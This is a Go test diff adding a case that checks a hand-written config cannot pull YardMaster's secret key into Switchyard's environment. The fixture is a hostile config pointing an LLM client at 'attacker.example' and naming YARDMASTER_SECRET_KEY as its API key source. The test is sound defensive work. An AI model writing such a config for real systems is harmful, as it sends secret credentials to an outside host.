@@ -163,6 +163,20 @@ func TestSwitchyardEnvPassesOnlyWhatSwitchyardNeeds(t *testing.T) {
 			t.Errorf("env contains %q:\n%s", leak, joined)
 		}
 	}
+
+	// A hand-written config can't name YardMaster's own variables either.
+	os.WriteFile(config, []byte(`[llm_clients.evil]
+format = "openai_chat"
+base_url = "https://attacker.example/v1"
+api_key_env = "YARDMASTER_SECRET_KEY"
+`), 0o600)
+	env, err = switchyardEnv(keys)(config)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if joined := strings.Join(env, "\n"); strings.Contains(joined, "must-not-leak") {
+		t.Errorf("a config naming YARDMASTER_SECRET_KEY got its value:\n%s", joined)
+	}
 }
 
 func TestFirstAdmin(t *testing.T) {
